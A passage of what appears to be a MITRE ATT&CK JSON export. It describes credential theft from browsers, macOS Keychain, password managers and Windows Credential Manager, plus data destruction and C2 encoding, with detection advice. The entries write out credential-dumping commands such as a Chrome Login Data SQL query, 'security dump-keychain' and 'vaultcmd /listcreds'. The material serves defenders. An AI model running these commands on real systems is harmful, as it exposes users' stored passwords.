created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Windows","data sources":"Command: Command Execution, Driver: Driver Load, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1543","defenses bypassed":null,"contributors":"Akshat Pradhan, Qualys; Matthew Demaske, Adaptforward; Mayuresh Dani, Qualys; Pedro Harrison; Wietze Beukema, @wietze","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, SYSTEM","relationship citations":"(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Talent-Jump Clambling February 2020),(Citation: TrendMicro Lazarus Nov 2018),(Citation: CyberBit Dtrack),(Citation: CISA AppleJeus Feb 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Kaspersky Carbanak),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Symantec Briba May 2012),(Citation: ESET OceanLotus),(Citation: Symantec Catchamas April 2018),(Citation: ESET Okrum July 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant UNC3313 Feb 2022),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Kazuar May 2017),(Citation: Github PowerShell Empire),(Citation: Symantec Nerex May 2012),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Unit 42 PingPull Jun 2022),(Citation: Talos Promethium June 2020),(Citation: McAfee Night Dragon),(Citation: US-CERT Bankshot Dec 2017),(Citation: Bitdefender StrongPity June 2020),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Russinovich Sysinternals),(Citation: Microsoft SIR Vol 21),(Citation: Trend Micro Iron Tiger April 2021),(Citation: ThreatStream Evasion Analysis),(Citation: Talos Bisonal Mar 2020),(Citation: Symantec Dyre June 2015),(Citation: Lotus Blossom Jun 2015),(Citation: US-CERT Emotet Jul 2018),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: RedCanary Mockingbird May 2020),(Citation: Lastline PlugX Analysis),(Citation: Palo Alto Networks BBSRAT),(Citation: Mandiant APT1 Appendix),(Citation: Symantec Hydraq Jan 2010),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Symantec Orangeworm April 2018),(Citation: ESET PipeMon May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: Unit 42 Shamoon3 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET Sednit Part 1),(Citation: CISA AA20-301A Kimsuky),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Dragos Crashoverride 2017),(Citation: Symantec Backdoor.Nidiran),(Citation: FireEye APT41 March 2020),(Citation: CIRCL PlugX March 2013),(Citation: Bitdefender Naikon April 2021),(Citation: Minerva Labs Black Basta May 2022),(Citation: TrendMicro PE_URSNIF.A2),(Citation: GitHub PowerSploit May 2012),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Kroll RawPOS Jan 2017),(Citation: Group IB Cobalt Aug 2017),(Citation: ESET Gelsemium June 2021),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Nccgroup Emissary Panda May 2018),(Citation: FireEye APT10 April 2017),(Citation: ESET Carbon Mar 2017),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: Palo Alto Shamoon Nov 2016),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Wiarp May 2012),(Citation: Secureworks Emotet Nov 2018),(Citation: Microsoft Wingbird Nov 2017),(Citation: FireEye FIN7 Aug 2018),(Citation: ESET LoudMiner June 2019),(Citation: ESET TeleBots Oct 2018),(Citation: Dell Sakula),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: McAfee Cuba April 2021),(Citation: F-Secure CozyDuke),(Citation: Symantec Naid June 2012),(Citation: Symantec Darkmoon Aug 2005),(Citation: Nccgroup Gh0st April 2018),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye WannaCry 2017),(Citation: Novetta Blockbuster),(Citation: Securelist DarkVishnya Dec 2018),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos ZxShell Oct 2014),(Citation: FireEye Operation Double Tap),(Citation: Symantec W32.Duqu),(Citation: ESET Attor Oct 2019),(Citation: FinFisher Citation),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: LogRhythm WannaCry),(Citation: Cylance Dust Storm),(Citation: Avertium Black Basta June 2022),(Citation: CrowdStrike Grim Spider May 2019),(Citation: F-Secure Cosmicduke),(Citation: Emissary Trojan Feb 2016),(Citation: Dell Lateral Movement),(Citation: Unit42 RDAT July 2020),(Citation: Cylance Shell Crew Feb 2017),(Citation: US-CERT Volgmer Nov 2017),(Citation: Palo Alto Reaver Nov 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: US-CERT TYPEFRAME June 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2020),(Citation: McAfee Bankshot),(Citation: TrendMicro RawPOS April 2015),(Citation: Trustwave GoldenSpy June 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: PWC KeyBoys Feb 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: PowerSploit Documentation),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Microsoft Winnti Jan 2017),(Citation: Sophos Ragnar May 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: Cylance Cleaver),(Citation: SANS Conficker),(Citation: Crowdstrike Indrik November 2018),(Citation: NCC Group Black Basta June 2022),(Citation: Malicious Driver Reporting Center),(Citation: Microsoft driver block rules)"}
{"ID":"T1555","name":"Credentials from Password Stores","description":"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.","url":"https://attack.mitre.org/techniques/T1555","created":"11 February 2020","last modified":"01 April 2022","version":"1.0","tactics":"Credential Access","detection":"Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Muddy Water March 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Volexity Patchwork June 2018),(Citation: Cybereason Astaroth Feb 2019),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: Symantec Leafminer July 2018),(Citation: GitHub Mimikatz lsadump Module),(Citation: CopyKittens Nov 2015),(Citation: FireEye APT34 July 2019),(Citation: FireEye APT33 Guardrail),(Citation: SecureWorks August 2019),(Citation: Infoblox Lokibot January 2019),(Citation: ESET Operation Groundbait),(Citation: Red Canary NETWIRE January 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: Symantec Elfin Mar 2019),(Citation: Deply Mimikatz),(Citation: Visa FIN6 Feb 2019),(Citation: NCSC Joint Report Public Tools),(Citation: Prevx Carberp March 2011),(Citation: F-Secure The Dukes),(Citation: Unit42 OilRig Playbook 2023),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender Chafer May 2020),(Citation: GitHub QuasarRAT),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Symantec MuddyWater Dec 2018),(Citation: ESET EvilNum July 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: FireEye APT28),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye APT35 2018),(Citation: GitHub Pupy),(Citation: ESET PLEAD Malware July 2018),(Citation: Cybereason Kimsuky November 2020),(Citation: GitHub LaZagne Dec 2018),"}
{"ID":"T1555.003","name":"Credentials from Password Stores: Credentials from Web Browsers","description":"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","url":"https://attack.mitre.org/techniques/T1555/003","created":"12 February 2020","last modified":"15 February 2022","version":"1.1","tactics":"Credential Access","detection":"Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access","is sub-technique":true,"sub-technique of":"T1555","defenses bypassed":null,"contributors":"Barry Shteiman, Exabeam; RedHuntLabs, @redhuntlabs; Ryan Benson, Exabeam; Sylvain Gil, Exabeam","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: XAgentOSX 2017),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Talos Konni May 2017),(Citation: Symantec Leafminer July 2018),(Citation: FireEye APT34 July 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Fidelis njRAT June 2013),(Citation: F-Secure BlackEnergy 2014),(Citation: objsee mac malware 2017),(Citation: Github PowerShell Empire),(Citation: CrowdStrike StellarParticle January 2022),(Citation: NCSC Joint Report Public Tools),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Zdnet Kimsuky Dec 2018),(Citation: JPCert TSCookie March 2018),(Citation: ESET PLEAD Malware July 2018),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Trend Micro Muddy Water March 2021),(Citation: Secureworks Karagany July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: FireEye NETWIRE March 2019),(Citation: Forcepoint Monsoon),(Citation: CISA AA20-301A Kimsuky),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Talos Kimsuky Nov 2021),(Citation: Cisco H1N1 Part 2),(Citation: Bitdefender Naikon April 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: Proofpoint NETWIRE December 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Check Point Rocket Kitten),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FireEye APT28),(Citation: FireEye APT35 2018),(Citation: Volexity Patchwork June 2018),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Telebots Dec 2016),(Citation: GitHub Mimikatz lsadump Module),(Citation: Accenture Hogfish April 2018),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Cyberreason Anchor December 2019),(Citation: Check Point Warzone Feb 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: Talos Group123),(Citation: Prevx Carberp March 2011),(Citation: ESET Zebrocy May 2019),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Talos Olympic Destroyer 2018),(Citation: Symantec Inception Framework March 2018),(Citation: Trend Micro Emotet Jan 2019),(Citation: Cybereason Kimsuky November 2020),(Citation: GitHub LaZagne Dec 2018),(Citation: IBM Grandoreiro April 2020),(Citation: Symantec Buckeye),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: FireEye APT33 Guardrail),(Citation: IBM IcedID November 2017),(Citation: Infoblox Lokibot January 2019),(Citation: BiZone Lizar May 2021),(Citation: ESET Operation Groundbait),(Citation: Citizen Lab Group5),(Citation: Talos Smoke Loader July 2018),(Citation: Deply Mimikatz),(Citation: Visa FIN6 Feb 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: F-Secure The Dukes),(Citation: Unit42 OilRig Playbook 2023),(Citation: GitHub QuasarRAT),(Citation: DustySky),(Citation: Talos PoetRAT April 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro njRAT 2018),(Citation: Cymmetria Patchwork),(Citation: GitHub Pupy),(Citation: Proofpoint TA505 Sep 2017),"}
{"ID":"T1555.001","name":"Credentials from Password Stores: Keychain","description":"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ","url":"https://attack.mitre.org/techniques/T1555/001","created":"12 February 2020","last modified":"18 April 2022","version":"1.1","tactics":"Credential Access","detection":"Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.","platforms":"macOS","data sources":"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1555","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: objsee mac malware 2017),(Citation: Securelist Calisto July 2018),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Symantec Calisto July 2018),(Citation: GitHub LaZagne Dec 2018),"}
{"ID":"T1555.005","name":"Credentials from Password Stores: Password Managers","description":"Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)","url":"https://attack.mitre.org/techniques/T1555/005","created":"22 January 2021","last modified":"25 March 2022","version":"1.0","tactics":"Credential Access","detection":"Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. \n\nConsider monitoring file reads surrounding known password manager applications.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access","is sub-technique":true,"sub-technique of":"T1555","defenses bypassed":null,"contributors":"Matt Burrough, @mattburrough, Microsoft","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: objsee mac malware 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: FoxIT Wocao December 2019),(Citation: NIST 800-63-3)"}
{"ID":"T1555.002","name":"Credentials from Password Stores: Securityd Memory","description":"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)","url":"https://attack.mitre.org/techniques/T1555/002","created":"12 February 2020","last modified":"08 March 2022","version":"1.1","tactics":"Credential Access","detection":"Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.","platforms":"Linux, macOS","data sources":"Command: Command Execution, Process: Process Access","is sub-technique":true,"sub-technique of":"T1555","defenses bypassed":null,"contributors":null,"permissions required":"root","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: synack 2016 review),"}
{"ID":"T1555.004","name":"Credentials from Password Stores: Windows Credential Manager","description":"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)","url":"https://attack.mitre.org/techniques/T1555/004","created":"23 November 2020","last modified":"21 October 2022","version":"1.1","tactics":"Credential Access","detection":"Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)","platforms":"Windows","data sources":"Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1555","defenses bypassed":null,"contributors":"Bernaldo Penas Antelo; Mugdha Peter Bansode; Uriel Kosayev; Vadim Khrykov","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: PowerSploit Documentation),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: SentinelOne Valak June 2020),(Citation: GitHub PowerSploit May 2012),(Citation: Symantec Waterbug Jun 2019),(Citation: FireEye APT34 July 2019),(Citation: Talos Group123),(Citation: Bitdefender Naikon April 2021),(Citation: BiZone Lizar May 2021),(Citation: Delpy Mimikatz Crendential Manager),(Citation: Cybereason Kimsuky November 2020),(Citation: GitHub LaZagne Dec 2018),(Citation: Microsoft Network access Credential Manager)"}
{"ID":"T1485","name":"Data Destruction","description":"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)","url":"https://attack.mitre.org/techniques/T1485","created":"14 March 2019","last modified":"25 March 2021","version":"1.1","tactics":"Impact","detection":"Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\Windows\\System32\\</code>.\n\nIn cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.","platforms":"IaaS, Linux, Windows, macOS","data sources":"Cloud Storage: Cloud Storage Deletion, Command: Command Execution, File: File Deletion, File: File Modification, Image: Image Deletion, Instance: Instance Deletion, Process: Process Creation, Snapshot: Snapshot Deletion, Volume: Volume Deletion","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Brent Murphy, Elastic; David French, Elastic; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee; Varonis Threat Labs","permissions required":"Administrator, root, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: ESET Telebots June 2017),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky Sodin July 2019),(Citation: Secureworks REvil September 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: McAfee Sodinokibi October 2019),(Citation: FireEye Shamoon Nov 2016),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft SDelete July 2016),(Citation: Picus Sodinokibi January 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: CERT-EE Gamaredon January 2021),(Citation: Intel 471 REvil March 2020),(Citation: Dragos Crashoverride 2017),(Citation: Novetta Blockbuster),(Citation: Microsoft WhisperGate January 2022),(Citation: Unit 42 Kazuar May 2017),(Citation: Volexity PowerDuke November 2016),(Citation: Kaspersky StoneDrill 2017),(Citation: ESET BlackEnergy Jan 2016),(Citation: McAfee Shamoon December 2018),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Cisco CaddyWiper March 2022),(Citation: Symantec Shamoon 2012),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye APT38 Oct 2018),(Citation: US-CERT Ukraine Feb 2016),(Citation: Talos Olympic Destroyer 2018),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: ESET CaddyWiper March 2022),(Citation: ESEST Black Energy Jan 2016),(Citation: ESET Hermetic Wizard March 2022),(Citation: Cybereason WhisperGate February 2022),(Citation: McAfee GhostSecret),(Citation: Unit42 Xbash Sept 2018),(Citation: Securelist BlackEnergy Feb 2015),(Citation: Ready.gov IT DRP)"}
{"ID":"T1132","name":"Data Encoding","description":"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.","url":"https://attack.mitre.org/techniques/T1132","created":"31 May 2017","last modified":"21 April 2023","version":"1.2","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Itzik Kotler, SafeBreach","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ProofPoint Ursnif Aug 2016),(Citation: Forcepoint Monsoon),(Citation: Mythc Documentation),(Citation: Anomali Linux Rabbit 2018),(Citation: Cisco H1N1 Part 2),(Citation: University of Birmingham C2)"}
